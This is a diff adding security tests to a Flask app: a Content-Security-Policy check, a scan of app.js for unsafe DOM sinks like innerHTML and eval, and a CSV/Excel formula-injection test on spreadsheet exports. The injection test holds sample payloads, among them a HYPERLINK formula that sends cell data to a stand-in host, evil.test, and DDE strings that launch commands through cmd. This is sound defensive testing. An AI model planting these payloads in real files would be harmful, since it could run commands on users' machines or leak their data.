@@ -21,6 +21,19 @@ class ThePasswordRules(unittest.TestCase):
             self.assertEqual(password_problem(fine, fine, "someone"), "", fine)
 
 
+class ThePolicy(_Secured):
+    def test_the_browser_refuses_to_turn_a_string_into_a_script_or_page(self):
+        csp = self.app.test_client().get("/login").headers["Content-Security-Policy"]
+        self.assertIn("require-trusted-types-for 'script'", csp)
+        self.assertIn("trusted-types 'none'", csp)
+
+    def test_the_site_script_writes_no_html_from_strings(self):
+        import pathlib
+        source = pathlib.Path(__file__).resolve().parents[1].joinpath("static", "app.js").read_text(encoding="utf-8")
+        for sink in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval(", "new Function", "createContextualFragment"):
+            self.assertNotIn(sink, source, sink)
+
+
 class TheScanner(_Secured):
     def test_files_a_scanner_looks_for_are_not_served(self):
         client = self.app.test_client()
@@ -166,6 +179,51 @@ class TheHttpsSite(unittest.TestCase):
         got = client.post("/logout", data={"csrf_token": tok}, base_url="https://site.test")
         self.assertIn("cache", got.headers.get("Clear-Site-Data", ""))
         self.assertIn("storage", got.headers.get("Clear-Site-Data", ""))
+
+
+class TheSpreadsheetsCannotRunWhatPeopleType(_Secured):
+    """Excel injection: a note that starts with = + - or @ must never become a formula in a file the site hands out."""
+    EVIL = ('=HYPERLINK("http://evil.test/?x="&A1,"click")', "+cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0", "@SUM(1+1)*cmd|' /C calc'!A0")
+
+    def test_no_download_contains_a_formula_made_from_typed_text(self):
+        import io
+        from openpyxl import load_workbook
+        store, admin = self.store, self.admin_id
+        for i, text in enumerate(self.EVIL):
+            store.set_attendance(program=self.alpha, shift_date="2026-10-14", associate=f"Alpha Person {i}", status="Sick",
+                                 from_min=None, to_min=None, billable=0, user_id=admin, at=1.0)
+            store.add_activity(program=self.alpha, shift_date="2026-10-14", associate="Alpha Person One", kind="Coaching", start=600 + i,
+                               end_min=630 + i, billable=0, note=text, user_id=admin, at=1.0)
+            store.add_day_log(program=self.alpha, shift_date="2026-10-14", associate="Alpha Person One", what=text, user_id=admin, at=1.0)
+            store.add_event(at=1.0, user_id=admin, kind="record", program=self.alpha, subject=text, detail=text)
+            store.add_leave(program=self.alpha, associate="Alpha Person One", user_id=admin, kind="Annual", first_day="2026-10-20",
+                            last_day="2026-10-21", note=text)
+        client = sign_in(self.app, "omar", "Owner-pass-123")
+        ids = {"run_id": self.runs[self.alpha], "schedule_id": self.sched[self.alpha], "name": self.alpha, "user_id": admin,
+               "request_id": 1, "swap_id": 1}
+        checked, formulas = 0, []
+        for rule in rules(self.app, "GET"):
+            args = {a: ids.get(a, "plan") for a in rule.arguments}
+            with self.app.test_request_context():
+                from flask import url_for
+                try:
+                    url = url_for(rule.endpoint, **args)
+                except Exception:
+                    continue
+            query = {"program": self.alpha, "from": "2026-10-01", "to": "2026-10-31", "format": "xlsx", "date": "2026-10-14",
+                     "week": "2026-10-11", "kind": list(__import__("webapp.exports", fromlist=["KINDS"]).KINDS)}
+            got = client.get(url, query_string=query)
+            if got.status_code != 200 or "spreadsheet" not in got.headers.get("Content-Type", ""):
+                continue
+            checked += 1
+            wb = load_workbook(io.BytesIO(got.data))
+            for ws in wb.worksheets:
+                for row in ws.iter_rows():
+                    for cell in row:
+                        if cell.data_type == "f" and any(bad.lstrip("=+-@")[:8] in str(cell.value) for bad in self.EVIL):
+                            formulas.append((rule.rule, ws.title, cell.coordinate, str(cell.value)[:40]))
+        self.assertGreater(checked, 2, "too few workbook downloads were reached by the sweep")
+        self.assertEqual(formulas, [], "typed text became a formula in a download")
 
 
 if __name__ == "__main__":
